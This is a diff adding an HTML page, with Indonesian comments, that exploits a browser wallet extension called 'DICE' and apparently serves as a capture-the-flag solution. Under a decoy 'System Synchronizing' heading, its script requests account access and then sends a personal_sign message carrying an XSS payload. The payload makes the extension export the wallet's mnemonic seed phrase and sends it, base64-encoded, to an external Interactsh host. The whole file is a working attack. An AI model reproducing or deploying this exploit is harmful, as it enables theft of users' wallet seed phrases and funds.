@@ -1,0 +1,34 @@
+<!DOCTYPE html>
+<html>
+<body>
+    <h1>System Synchronizing... Please wait.</h1>
+    <script>
+        // Ganti dengan URL Interactsh milikmu
+        const MY_INTERACTSH = "https://nqktbbtmcqldndrenwoq27kiobjnhdrr1.oast.fun";
+
+        async function startHeist() {
+            // Step 1: Minta koneksi agar 'personal_sign' diizinkan
+            window.postMessage({
+                type: "DICE_PROVIDER_REQUEST",
+                method: "eth_requestAccounts",
+                params: []
+            }, "*");
+
+            // Tunggu sebentar agar request pertama diproses
+            setTimeout(() => {
+                // Step 2: Kirim payload XSS lewat 'personal_sign'
+                // Kita injeksi script ke dalam parameter 'message' yang dirender innerHTML
+                const xssPayload = `<img src=x onerror="chrome.runtime.sendMessage({type:'DICE_POPUP',action:'exportMnemonic'},(r)=>{fetch('${MY_INTERACTSH}/?flag='+btoa(r.result.mnemonic))})">`;
+
+                window.postMessage({
+                    type: "DICE_PROVIDER_REQUEST",
+                    method: "personal_sign",
+                    params: [xssPayload, "0x0000000000000000000000000000000000000000"]
+                }, "*");
+            }, 500);
+        }
+
+        startHeist();
+    </script>
+</body>
+</html>
